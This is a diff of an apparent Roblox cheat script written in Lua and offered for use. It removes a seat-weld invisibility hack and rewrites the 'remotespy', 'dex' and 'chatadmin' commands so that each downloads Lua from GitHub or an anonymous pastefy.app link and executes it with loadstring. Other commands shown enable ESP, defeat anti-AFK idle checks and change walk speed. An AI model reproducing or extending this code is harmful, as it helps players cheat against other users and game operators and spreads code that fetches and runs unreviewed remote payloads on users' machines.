@@ -9,48 +9,6 @@ local TeleportService=game:GetService("TeleportService")
 local HttpService=game:GetService("HttpService")
 local cr1mFlyStates={wasdfly={active=false,bg=nil,bv=nil,conn1=nil,conn2=nil},mfly={active=false,bv=nil,bg=nil,renderConn=nil}}
 local cr1mNoclipConn
-local player=Players.LocalPlayer
-local sound=Instance.new("Sound",player:WaitForChild("PlayerGui"))
-sound.SoundId="rbxassetid://942127495"
-sound.Volume=1
-local isInvisible=false
-local invisChairName="Bye bye bitch Im invis"
-local fakePos=Vector3.new(-25.95,84,3537.55)
-local function setTransparency(character,value)
-for _,v in pairs(character:GetDescendants())do
-if v:IsA("BasePart")or v:IsA("Decal")then
-v.Transparency=value
-end
-end
-end
-local function toggleInvisibility(forceDisable)
-if forceDisable then isInvisible=false end
-isInvisible=forceDisable and false or not isInvisible
-sound:Play()
-local char=player.Character
-if not char or not char:FindFirstChild("HumanoidRootPart")then return end
-if isInvisible then
-local savedPos=char.HumanoidRootPart.CFrame
-char:MoveTo(fakePos)
-wait(0.15)
-local seat=Instance.new("Seat",workspace)
-seat.Name=invisChairName
-seat.Anchored=false
-seat.CanCollide=false
-seat.Transparency=1
-seat.Position=fakePos
-local weld=Instance.new("Weld",seat)
-weld.Part0=seat
-weld.Part1=char:FindFirstChild("Torso")or char:FindFirstChild("UpperTorso")
-wait()
-seat.CFrame=savedPos
-setTransparency(char,0.5)
-else
-local chair=workspace:FindFirstChild(invisChairName)
-if chair then chair:Destroy()end
-setTransparency(char,0)
-end
-end
 local TweenService=game:GetService("TweenService")
 local UIS=game:GetService("UserInputService")
 local function split(txt)
@@ -157,9 +115,9 @@ local spdHum=spdChar:FindFirstChildOfClass("Humanoid")
 if spdHum then spdHum.WalkSpeed=spdVal end
 end
 end
-commandHandlers.remotespy=function(args)cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")end
-commandHandlers.dex=function(args)cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")end
-commandHandlers.chatadmin=function(args)cr1mFetch("https://pastefy.app/H6k8QmIp/raw")end
+commandHandlers.remotespy=function(args)local function cr1mFetch(url)local s,r=pcall(function()return game:HttpGet(url)end)if s and r then pcall(function()loadstring(r)()end)end end cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")end
+commandHandlers.dex=function(args)local function cr1mFetch(url)local s,r=pcall(function()return game:HttpGet(url)end)if s and r then pcall(function()loadstring(r)()end)end end cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")end
+commandHandlers.chatadmin=function(args)local function cr1mFetch(url)local s,r=pcall(function()return game:HttpGet(url)end)if s and r then pcall(function()loadstring(r)()end)end end cr1mFetch("https://pastefy.app/H6k8QmIp/raw")end
 commandHandlers.reset=function(args)
 local rstChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 rstChar:BreakJoints()
@@ -284,8 +242,6 @@ commandHandlers.unfullbright=function(args)Lighting.Brightness=2 Lighting.ClockT
 commandHandlers.esp=function(args)getgenv().Cr1msonESP()end
 commandHandlers.unesp=function(args)getgenv().unCr1msonESP()end
 commandHandlers.antiafk=function(args)for _,v in pairs(getconnections(Players.LocalPlayer.Idled))do v:Disable()end end
-commandHandlers.invis=function(args)toggleInvisibility(false)end
-commandHandlers.uninvis=function(args)if isInvisible then toggleInvisibility(true)end end
 local function runCommand(txt)
 if txt==""then return end
 local args=split(txt)
